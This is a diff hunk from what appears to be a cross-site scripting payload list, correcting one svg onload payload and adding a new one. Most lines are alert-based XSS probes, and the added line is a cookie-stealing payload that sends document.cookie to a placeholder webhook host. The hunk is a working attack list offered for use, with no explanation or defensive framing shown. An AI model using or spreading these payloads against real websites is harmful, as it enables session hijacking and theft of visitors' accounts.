@@ -7,4 +7,5 @@
 <img src=x onerror=alert(1)>
 "><img src=x onerror=alert(1)>
 <svg/onload=alert('hacked')>
-"><<svg/onload=alert('hacked')>
+"><svg/onload=alert('hacked')>
+<script>document.write('<img src="enterwebhooksiteurl?c='+document.cookie+'" />')</script>
